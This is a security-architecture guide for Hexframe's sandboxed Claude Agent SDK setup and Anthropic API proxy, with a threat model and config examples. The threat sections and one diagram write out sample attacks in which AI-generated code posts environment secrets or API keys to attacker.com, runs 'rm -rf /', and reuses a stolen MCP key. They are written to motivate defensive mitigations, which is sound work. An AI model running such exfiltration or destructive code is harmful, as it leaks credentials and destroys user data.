# Claude SDK Security Architecture

> **Complete guide to Hexframe's secure AI agent execution with Anthropic Claude SDK**

## Table of Contents
- [Overview](#overview)
- [Development vs Production](#development-vs-production)
- [Anthropic Proxy Architecture](#anthropic-proxy-architecture)
- [Security Threats & Mitigations](#security-threats--mitigations)
- [Environment Configuration](#environment-configuration)
- [Architecture Diagrams](#architecture-diagrams)

---

## Overview

Hexframe uses the [Anthropic Claude Agent SDK](https://github.com/anthropics/anthropic-agent-sdk) to enable AI agents that can execute code and use tools. This creates **critical security risks** because:

1. **AI-generated code execution**: The SDK allows Claude to generate and execute arbitrary code
2. **Environment access**: Executed code can access environment variables, file system, and network
3. **Secret exposure**: Without proper isolation, API keys and credentials can be stolen

This document explains our **defense-in-depth security architecture** to mitigate these risks.

---

## Development vs Production

### 🚨 **CRITICAL DIFFERENCE**

| Aspect | Development (`USE_SANDBOX=false`) | Production (`USE_SANDBOX=true`) |
|--------|-----------------------------------|----------------------------------|
| **Execution** | Direct SDK in Next.js process | Isolated Vercel Sandbox microVM |
| **Security** | ⚠️ **UNSAFE** - Full environment access | ✅ **SAFE** - Isolated environment |
| **Performance** | Faster, no cold starts | ~2s sandbox initialization overhead |
| **Debugging** | Easy, local logs | Harder, logs in Vercel infrastructure |
| **Use Case** | Local development only | Production & staging |
| **API Keys** | Proxied (see below) | Proxied (see below) |
| **MCP Access** | Full user data access | Full user data access |

### ⚠️ Why Development Mode is Unsafe

When `USE_SANDBOX=false`, the Claude Agent SDK runs **directly inside the Next.js server process**, giving AI-generated code:

- **Full access to `process.env`** → Can steal all environment variables including:
  - `ANTHROPIC_API_KEY` (despite proxy, see below)
  - `DATABASE_URL` with credentials
  - `AUTH_SECRET`
  - OAuth client secrets
  - Any other secrets

- **File system access** → Can read:
  - `.env` files
  - `node_modules` (source code)
  - Database files
  - SSH keys (`~/.ssh`)

- **Network access** → Can make arbitrary HTTP requests:
  - Exfiltrate data to attacker servers
  - Scan internal network
  - Attack other services

**⚠️ NEVER deploy to production with `USE_SANDBOX=false`**

### ✅ Why Sandbox Mode is Safe

When `USE_SANDBOX=true`, code executes in a **Vercel Sandbox microVM**:

- **Isolated environment**: Fresh Node.js instance with no access to parent process
- **Clean process.env**: Only receives explicitly passed variables
- **Network restrictions**: Can only access explicitly allowed URLs
- **No file system access**: Runs in ephemeral container
- **Automatic cleanup**: Environment destroyed after execution

---

## Anthropic Proxy Architecture

### The Problem: SDK Hardcoded URLs

The Anthropic Claude Agent SDK is **closed-source** and **hardcodes** the Anthropic API URL:
```typescript
// Inside @anthropic-ai/claude-agent-sdk (we can't modify this)
const ANTHROPIC_API = "https://api.anthropic.com/v1/messages"
```

This means we **cannot** simply change `ANTHROPIC_BASE_URL` because the SDK ignores it for certain internal calls.

### Our Solution: Network-Level Interception + Proxy

We implement **defense-in-depth** with three layers:

#### Layer 1: Network Interceptor (Catch Hardcoded URLs)
```typescript
// src/lib/domains/agentic/repositories/_helpers/network-interceptor.ts
globalThis.fetch = async (url, init) => {
  // Intercept ALL calls to api.anthropic.com
  if (url.includes('api.anthropic.com')) {
    // Redirect to our proxy
    return fetch('https://yourdomain.com/api/anthropic-proxy/...', {
      ...init,
      headers: { 'x-api-key': INTERNAL_PROXY_SECRET }
    })
  }
  return originalFetch(url, init)
}
```

**Injected in both modes:**
- **Non-sandbox**: Installed in parent Node.js process
- **Sandbox**: Injected into sandbox execution script

#### Layer 2: Secure Proxy (Validate & Forward)
```typescript
// src/app/api/anthropic-proxy/[...path]/route.ts
export async function POST(request) {
  // 1. Validate proxy secret
  const clientSecret = request.headers.get('x-api-key')
  if (clientSecret !== INTERNAL_PROXY_SECRET) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // 2. Use REAL API key (not accessible to SDK)
  const realApiKey = process.env.ANTHROPIC_API_KEY_ORIGINAL

  // 3. Forward to Anthropic with bypass flag
  return fetch('https://api.anthropic.com/v1/messages', {
    headers: {
      'x-api-key': realApiKey,
      'x-bypass-interceptor': 'true' // Prevent infinite loop
    }
  })
}
```

#### Layer 3: API Key Isolation

```typescript
// Parent process environment setup
process.env.ANTHROPIC_API_KEY_ORIGINAL = 'sk-ant-api03-...' // Save original
process.env.ANTHROPIC_API_KEY = INTERNAL_PROXY_SECRET       // Overwrite for SDK
```

**Key separation:**
- SDK sees: `INTERNAL_PROXY_SECRET` (64-char random hex, useless outside our app)
- Proxy uses: `ANTHROPIC_API_KEY_ORIGINAL` (real API key, never exposed to SDK)

### Why This Matters

**Without the proxy**, AI-generated code could:
```javascript
// Malicious code in sandbox
const apiKey = process.env.ANTHROPIC_API_KEY
await fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ apiKey }) // Sends real API key!
})
```

**With the proxy**, the stolen key is worthless:
```javascript
// AI-generated code gets:
process.env.ANTHROPIC_API_KEY // = "5549688546d8c2..." (internal secret)

// Attacker tries to use it:
await fetch('https://api.anthropic.com/v1/messages', {
  headers: { 'x-api-key': '5549688546d8c2...' }
})
// ❌ Anthropic rejects: "invalid x-api-key"

// Can only be used through OUR proxy (which we control):
await fetch('https://hexframe.com/api/anthropic-proxy/v1/messages', {
  headers: { 'x-api-key': '5549688546d8c2...' }
})
// ✅ Proxy validates, uses real key, forwards request
// But we can add: rate limiting, logging, cost tracking, user quotas!
```

### Proxy Benefits

1. **Security**: Real API key never exposed to AI-generated code
2. **Monitoring**: Log all API calls, costs, tokens used
3. **Rate Limiting**: Prevent abuse (50-200 requests/hour per user)
4. **Cost Control**: Set budget limits per user/request
5. **Audit Trail**: Track which user made which AI requests
6. **Graceful Degradation**: Switch providers without SDK changes

---

## Security Threats & Mitigations

### Threat 1: Anthropic API Key Theft ✅ MITIGATED

**Attack Vector:**
```javascript
// AI-generated code tries to steal API key
console.log(process.env.ANTHROPIC_API_KEY)
await fetch('https://attacker.com', {
  body: JSON.stringify(process.env)
})
```

**Mitigation:**
- ✅ **Network interceptor** catches hardcoded URLs
- ✅ **Proxy validation** ensures only our secret works
- ✅ **API key isolation** via `ANTHROPIC_API_KEY_ORIGINAL`
- ✅ **Sandbox mode** in production prevents env access

**Residual Risk:** Low - Even if stolen, internal secret is useless outside our infrastructure

---

### Threat 2: MCP API Key Theft ⚠️ PARTIALLY MITIGATED

**Attack Vector:**
```javascript
// AI-generated code in sandbox
const mcpConfig = // Injected in execution script
const mcpApiKey = mcpConfig.headers['x-api-key']

// Steal the key
await fetch('https://attacker.com/steal-mcp', {
  body: JSON.stringify({ mcpApiKey })
})

// Use stolen key to access user data
await fetch('https://hexframe.com/api/mcp', {
  method: 'POST',
  headers: { 'x-api-key': mcpApiKey },
  body: JSON.stringify({
    jsonrpc: '2.0',
    method: 'tools/call',
    params: {
      name: 'getItemByCoords',
      arguments: { userId: 'victim', path: [0] }
    }
  })
})
// 🚨 Can access ALL of victim's hexframe maps!
```

**What MCP API Key Grants Access To:**

The MCP (Model Context Protocol) API key allows:

1. **Read Access:**
   - `getCurrentUser` - Get user profile and mappingId
   - `getItemsForRootItem` - Read entire hexagonal map hierarchy
   - `getItemByCoords` - Read specific map tiles with full content
   - `mapItemsList` - List all user's map items
   - `mapItemHandler` - Get detailed item information

2. **Write Access:**
   - `addItem` - Create new map tiles
   - `updateItem` - Modify existing tiles (title, content, preview, URL)
   - `moveItem` - Reorganize map structure
   - `deleteItem` - Delete tiles and entire subtrees ⚠️ DESTRUCTIVE

3. **Scope:**
   - Per-user API key (linked to userId in database)
   - Scoped to that user's data only
   - No cross-user access (enforced by IAM domain)
   - Rate limits applied per user

**Current Mitigations:**
- ✅ **User-scoped keys**: Each MCP key only accesses that user's data
- ✅ **Database-level isolation**: IAM domain enforces userId boundaries
- ✅ **Audit logging**: All MCP tool calls are logged
- ✅ **Rate limiting**: Prevents mass data exfiltration

**Current Mitigations:** ✅ IMPLEMENTED
1. **Short-lived session tokens** (10 minutes TTL)
   - MCP keys auto-expire after 10 minutes
   - Keys automatically rotated on each new agent request
   - Purpose changed from `'mcp'` to `'mcp-session'` to distinguish
   - Expired keys auto-deactivated during validation

**Residual Risk:** Low-Medium (significantly improved!)
- ✅ Stolen keys expire within 10 minutes (was: indefinite)
- ✅ Keys auto-rotate between sessions (was: persistent)
- ⚠️ Within 10-min window, malicious AI code CAN:
  - Steal user's own data
  - Modify/delete user's maps
  - Exfiltrate to external servers (if no network restrictions)
- ⚠️ No way to distinguish legitimate vs. malicious SDK usage

**Recommended Future Mitigations:**

1. **Operation allowlisting**
   - Default: Read-only access (getCurrentUser, getItems*)
   - Opt-in: Write access (addItem, updateItem, etc.)
   - Require explicit user confirmation for destructive ops

2. **Transaction log & rollback**
   - Log all write operations with timestamps
   - Implement "undo" functionality for AI changes
   - Alert user on suspicious patterns (mass deletes, rapid changes)

3. **Anomaly detection**
   - Flag unusual API patterns (100 reads in 1 second)
   - Throttle based on behavior, not just rate
   - Require CAPTCHA for suspicious sessions

4. **Sandbox network restrictions**
   - Whitelist only hexframe.com and anthropic proxy
   - Block all other outbound connections
   - Prevent data exfiltration to attacker servers

**Implementation Priority:** Medium (primary risk mitigated)
- Short-lived tokens reduce exposure from indefinite to 10 minutes
- Remaining risks are lower priority
- Can be addressed post-launch if needed

---

### Threat 3: Database Credentials Theft ✅ MITIGATED (Sandbox Only)

**Attack Vector:**
```javascript
// Non-sandbox mode
console.log(process.env.DATABASE_URL)
// "postgres://user:password@host/db"
```

**Mitigation:**
- ✅ **Sandbox mode** isolates environment (production)
- ⚠️ **Non-sandbox mode** exposes credentials (dev only)

**Residual Risk:** Low in production, High in development

---

### Threat 4: Code Injection & RCE ✅ MITIGATED (Sandbox Only)

**Attack Vector:**
```javascript
// AI generates malicious code
const { exec } = require('child_process')
exec('rm -rf /', (error, stdout) => {
  // Destroy file system
})
```

**Mitigation:**
- ✅ **Sandbox isolation** prevents host access
- ✅ **Ephemeral containers** auto-destroyed
- ⚠️ **Non-sandbox mode** vulnerable (dev only)

**Residual Risk:** Low in production, High in development

---

### Threat 5: Denial of Service ✅ MITIGATED

**Attack Vector:**
```javascript
// Infinite loop
while(true) { await fetch('https://api.anthropic.com') }
```

**Mitigation:**
- ✅ **Sandbox timeout** (5 minutes max)
- ✅ **Budget limits** ($1.00 per request)
- ✅ **Rate limiting** (50-200 req/hour)
- ✅ **Max turns limit** (50 turns per agent session)

**Residual Risk:** Low

---

## Environment Configuration

### Required Environment Variables

#### Production (`USE_SANDBOX=true`)
```bash
# Execution Mode
USE_SANDBOX=true                    # Enable Vercel Sandbox isolation

# Anthropic Proxy (CRITICAL)
USE_ANTHROPIC_PROXY=true            # Enable proxy security layer
INTERNAL_PROXY_SECRET=<64-char-hex> # Generate with: openssl rand -hex 32
ANTHROPIC_API_KEY=sk-ant-api03-...  # Real Anthropic API key (never exposed)

# Vercel Sandbox (Production Only)
VERCEL_OIDC_TOKEN=<token>          # Get from deployed Vercel environment
HEXFRAME_API_BASE_URL=https://hexframe.com  # Public URL for MCP callbacks

# Database & Auth (as usual)
DATABASE_URL=postgres://...
AUTH_SECRET=...
```

#### Development (`USE_SANDBOX=false`)
```bash
# Execution Mode
USE_SANDBOX=false                   # Direct SDK execution (UNSAFE)

# Anthropic Proxy (CRITICAL - still needed!)
USE_ANTHROPIC_PROXY=true            # Proxy works in both modes
INTERNAL_PROXY_SECRET=<64-char-hex> # Same secret as production
ANTHROPIC_API_KEY=sk-ant-api03-...  # Real Anthropic API key

# Local Development
HEXFRAME_API_BASE_URL=https://<ngrok-id>.ngrok-free.app  # If testing MCP
# OR
HEXFRAME_API_BASE_URL=http://localhost:3000  # Default (non-sandbox only)

# Database & Auth (as usual)
DATABASE_URL=postgres://...
AUTH_SECRET=...
```

### Configuration Files

**`.env` (committed, shared defaults):**
```bash
# Execution mode (override in .env.local for dev)
USE_SANDBOX=true
USE_ANTHROPIC_PROXY=true
```

**`.env.local` (gitignored, developer-specific):**
```bash
# Development override
USE_SANDBOX=false  # Only for local dev!

# Your API keys
ANTHROPIC_API_KEY=sk-ant-api03-...
INTERNAL_PROXY_SECRET=abc123...

# Local URLs
HEXFRAME_API_BASE_URL=http://localhost:3000
```

**Vercel Environment Variables (production):**
```bash
# Set via: vercel env add USE_SANDBOX
USE_SANDBOX=true
USE_ANTHROPIC_PROXY=true
ANTHROPIC_API_KEY=<production-key>
INTERNAL_PROXY_SECRET=<production-secret>

# Auto-available in Vercel:
VERCEL_OIDC_TOKEN=<auto-injected>
```

### Getting Vercel OIDC Token

The `VERCEL_OIDC_TOKEN` is **only available in deployed Vercel environments**:

```typescript
// Automatically available in production
process.env.VERCEL_OIDC_TOKEN // Set by Vercel at runtime
```

For local testing with sandbox:
1. **DON'T** use `vercel env pull` (pulls production secrets!)
2. **DO** deploy to Vercel preview/staging
3. **OR** use non-sandbox mode for local dev

---

## Architecture Diagrams

### Production Flow (Sandbox + Proxy)

```
┌─────────────────────────────────────────────────────────────────┐
│ User Request: "Create a new map tile"                          │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│ Next.js Server (Parent Process)                                │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ Environment Variables:                                      │ │
│ │ • ANTHROPIC_API_KEY = "sk-ant-api03-ABC..." (REAL KEY)    │ │
│ │ • INTERNAL_PROXY_SECRET = "5549688546..." (RANDOM HEX)    │ │
│ │ • DATABASE_URL = "postgres://..." (SENSITIVE)              │ │
│ │ • AUTH_SECRET = "..." (SENSITIVE)                          │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                  │
│ 1. Create Vercel Sandbox microVM                               │
│ 2. Pass ONLY safe environment variables:                       │
│    • ANTHROPIC_BASE_URL = "https://hexframe.com/proxy"        │
│    • ANTHROPIC_API_KEY = INTERNAL_PROXY_SECRET (useless)      │
│    • MCP_API_KEY = <user-specific-mcp-key>  ⚠️ EXPOSED       │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│ Vercel Sandbox (Isolated microVM)                              │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ Clean Environment (ONLY what we pass):                      │ │
│ │ • ANTHROPIC_BASE_URL = "https://hexframe.com/proxy"        │ │
│ │ • ANTHROPIC_API_KEY = "5549688546..." (PROXY SECRET)       │ │
│ │ NO DATABASE_URL, NO AUTH_SECRET, NO REAL API KEY           │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                  │
│ 3. Install network interceptor (globalThis.fetch override)     │
│ 4. Run Claude Agent SDK with MCP tools                          │
│ 5. AI generates code: "Create map tile..."                     │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼ AI tries to use Anthropic API
┌─────────────────────────────────────────────────────────────────┐
│ Network Interceptor (Inside Sandbox)                           │
│                                                                  │
│ 6. Catch fetch("https://api.anthropic.com/v1/messages")       │
│ 7. Redirect to: https://hexframe.com/api/anthropic-proxy/...  │
│ 8. Add header: x-api-key: INTERNAL_PROXY_SECRET                │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│ Anthropic Proxy Route (/api/anthropic-proxy/[...path])        │
│                                                                  │
│ 9. Validate: request.headers['x-api-key'] === INTERNAL_SECRET  │
│ 10. Get REAL key: process.env.ANTHROPIC_API_KEY_ORIGINAL      │
│ 11. Forward to Anthropic with REAL key                         │
│     Add header: x-bypass-interceptor: true (prevent loop)      │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│ Anthropic API (https://api.anthropic.com)                     │
│                                                                  │
│ 12. Validate: x-api-key = "sk-ant-api03-ABC..." ✅ REAL KEY   │
│ 13. Process request, return response                            │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼ Response flows back
┌─────────────────────────────────────────────────────────────────┐
│ Result: Map tile created, user data updated                    │
│ Sandbox destroyed, MCP key still valid ⚠️                      │
└─────────────────────────────────────────────────────────────────┘
```

### Development Flow (Direct SDK + Proxy)

```
┌─────────────────────────────────────────────────────────────────┐
│ User Request: "Create a new map tile"                          │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│ Next.js Server (Single Process)                                │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ Environment Variables (ALL EXPOSED):                        │ │
│ │ • ANTHROPIC_API_KEY_ORIGINAL = "sk-ant-..." (SAVED)        │ │
│ │ • ANTHROPIC_API_KEY = "5549688546..." (OVERWRITTEN)        │ │
│ │ • DATABASE_URL = "postgres://..."  ⚠️ EXPOSED              │ │
│ │ • AUTH_SECRET = "..."  ⚠️ EXPOSED                          │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                  │
│ 1. Install network interceptor (globalThis.fetch)              │
│ 2. Run Claude Agent SDK directly (same process!)               │
│ 3. AI-generated code has FULL access to process.env            │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼ AI code executes in same process
┌─────────────────────────────────────────────────────────────────┐
│ AI-Generated Code (DANGEROUS)                                  │
│                                                                  │
│ // AI could do this:                                           │
│ const allSecrets = process.env;                                │
│ await fetch('https://attacker.com', {                          │
│   body: JSON.stringify(allSecrets)  // 🚨 ALL SECRETS LEAKED  │
│ })                                                              │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼ Normal flow continues
┌─────────────────────────────────────────────────────────────────┐
│ Network Interceptor (Same Process)                             │
│ 4. Catch API calls, redirect to proxy (same as sandbox)        │
└────────────────┬────────────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│ Proxy validates & forwards (same as sandbox)                   │
└─────────────────────────────────────────────────────────────────┘

⚠️ CRITICAL: This mode is ONLY safe for local development!
```

---

## Security Checklist

Before deploying to production:

- [ ] `USE_SANDBOX=true` in production environment
- [ ] `USE_ANTHROPIC_PROXY=true` in all environments
- [ ] `INTERNAL_PROXY_SECRET` is 64+ characters, random, unique
- [ ] `VERCEL_OIDC_TOKEN` available in Vercel (auto-injected)
- [ ] `HEXFRAME_API_BASE_URL` set to public domain (not localhost)
- [ ] All `.env.local` files in `.gitignore`
- [ ] No API keys committed to git
- [x] **Short-lived MCP session tokens** (10 min TTL) ✅ IMPLEMENTED
- [ ] MCP rate limiting configured (200 req/hour)
- [ ] MCP operation logging enabled
- [ ] Sandbox timeout set (5 minutes default)
- [ ] Budget limits configured ($1.00/request default)

Optional but recommended:
- [ ] Add MCP operation allowlisting (read-only default)
- [ ] Enable transaction log & rollback for AI changes
- [ ] Set up anomaly detection for API usage
- [ ] Configure network allowlist in sandbox

---

## References

- [Anthropic Claude Agent SDK](https://github.com/anthropics/anthropic-agent-sdk)
- [Vercel Sandbox Documentation](https://vercel.com/docs/functions/sandbox)
- [Model Context Protocol (MCP) Spec](https://spec.modelcontextprotocol.io/)
- [OWASP Top 10 for LLMs](https://owasp.org/www-project-top-10-for-large-language-model-applications/)

---

## Questions & Support

**Q: Why not just use environment variables instead of proxy?**
A: The SDK hardcodes URLs and uses private APIs we can't intercept with env vars alone.

**Q: Can I disable the proxy for better performance?**
A: No. Proxy adds <50ms latency but prevents API key theft. Non-negotiable for production.

**Q: What happens if internal proxy secret leaks?**
A: Rotate it immediately via `openssl rand -hex 32`. Update in all environments. No user data at risk, but regenerate MCP keys to be safe.

**Q: Why is MCP key exposed to sandbox?**
A: Technical limitation - SDK needs to call MCP tools with authentication. We mitigate this with 10-minute session tokens that auto-expire and rotate.

**Q: Can I test sandbox mode locally?**
A: Partially. You need either: (1) Deploy to Vercel preview/staging, or (2) Use ngrok + mock OIDC token (not recommended).

---

**Last Updated:** 2025-11-05
**Version:** 1.1.0 - Added short-lived session tokens
**Maintainers:** Hexframe Security Team
